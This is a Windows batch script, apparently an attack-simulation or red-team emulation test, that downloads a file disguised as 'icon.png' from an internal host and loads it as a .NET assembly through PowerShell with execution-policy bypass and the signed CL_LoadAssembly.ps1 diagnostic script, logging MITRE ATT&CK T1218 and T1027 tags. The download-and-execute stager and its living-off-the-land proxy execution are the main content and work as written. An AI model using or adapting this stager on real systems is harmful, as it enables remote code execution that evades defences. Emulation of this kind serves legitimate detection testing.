@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET aqDcX=%APPDATA%\10923\8a32b409
SET rZqMn=d5e833be.txt
SET bNmVc=https://10.0.0.49/stage/2/icon.png?10923-7
SET xQpLk=ITZEL-S2BO
SET zXmQp=10923
SET vBmNc=7
SET kLpMx=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once for all debug lines
SET tsvar=!DATE!/!TIME!

REM --- Step 1: Heartbeat fetch ---
echo [!tsvar!][DEBUG][!xQpLk!][!zXmQp!]: heartbeat_start>> "!kLpMx!" 2>nul
curl -k -s -o "!aqDcX!\!rZqMn!" "!bNmVc!" >nul 2>&1
if !ERRORLEVEL! equ 0 (
    echo [!tsvar!][DEBUG][!xQpLk!][!zXmQp!]: heartbeat_complete=0>> "!kLpMx!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!xQpLk!][!zXmQp!]: heartbeat_complete=!ERRORLEVEL!>> "!kLpMx!" 2>nul
)

REM --- Step 2: Change working directory ---
echo [!tsvar!][DEBUG][!xQpLk!][!zXmQp!]: chdir_start>> "!kLpMx!" 2>nul
cd /d "!aqDcX!" >nul 2>&1
echo [!tsvar!][DEBUG][!xQpLk!][!zXmQp!]: chdir_result=!ERRORLEVEL!>> "!kLpMx!" 2>nul

REM --- Step 3: Invoke Stage 2 Loader DLL via LOLBIN (PowerShell + CL_LoadAssembly) ---
echo [!tsvar!][DEBUG][!xQpLk!][!zXmQp!]: rundll32_start>> "!kLpMx!" 2>nul
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath %APPDATA%\10923\8a32b409\d5e833be.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)" >nul 2>&1
echo [!tsvar!][DEBUG][!xQpLk!][!zXmQp!]: rundll32_result=!ERRORLEVEL!>> "!kLpMx!" 2>nul

REM --- Logging TTP events ---
REM T1218: System Binary Proxy Execution
echo [!tsvar!][TTP][!xQpLk!][!zXmQp!]: T1218^|System Binary Proxy Execution=OK:>> "!kLpMx!" 2>nul
if !ERRORLEVEL! neq 0 (
    echo [!tsvar!][TTP][!xQpLk!][!zXmQp!]: T1218^|System Binary Proxy Execution=FAIL:non-zero exit code>> "!kLpMx!" 2>nul
)

REM T1027: Obfuscated Files or Information
echo [!tsvar!][TTP][!xQpLk!][!zXmQp!]: T1027^|Obfuscated Files or Information=OK:>> "!kLpMx!" 2>nul
if !ERRORLEVEL! neq 0 (
    echo [!tsvar!][TTP][!xQpLk!][!zXmQp!]: T1027^|Obfuscated Files or Information=FAIL:non-zero exit code>> "!kLpMx!" 2>nul
)

REM Exit immediately, no background loops
ENDLOCAL
exit /b 0